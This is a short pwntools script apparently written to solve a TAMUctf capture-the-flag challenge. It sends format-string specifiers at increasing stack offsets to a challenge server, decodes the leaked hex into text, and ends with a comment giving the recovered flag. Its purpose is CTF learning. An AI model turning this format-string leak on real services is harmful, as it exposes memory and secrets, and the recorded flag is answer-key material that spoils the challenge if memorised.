from pwn import *

process = remote("challenges.tamuctf.com", 4251)


for i in range(100):
	try:
		print process.recv()
		print "[+] Trying %"+str(i)+"$016lX"
		process.sendline("%"+str(i)+"$016lX")
		#process.recvuntil("\n")
		process_response = process.recvuntil("\n")
		print process_response
		## splitting every 2 chars
		n = 2
		splitted = [process_response[i:i+n] for i in range(0, len(process_response), n)]
		print splitted
		for char in splitted:
			print chr(int(char, 16)),
	except Exception:
		process = remote("challenges.tamuctf.com", 4251)
		pass

'''
Flag is: gigem{3asy_f0rmat_vuln1}
a 			a 3 { m e g i g
3			a m r 0 f _ y s
{			} 1 n l u v _ t
m
e
g
i
g


a
m
r
0
f
_
y
s

}
1
n
l
u
v
_
t

'''
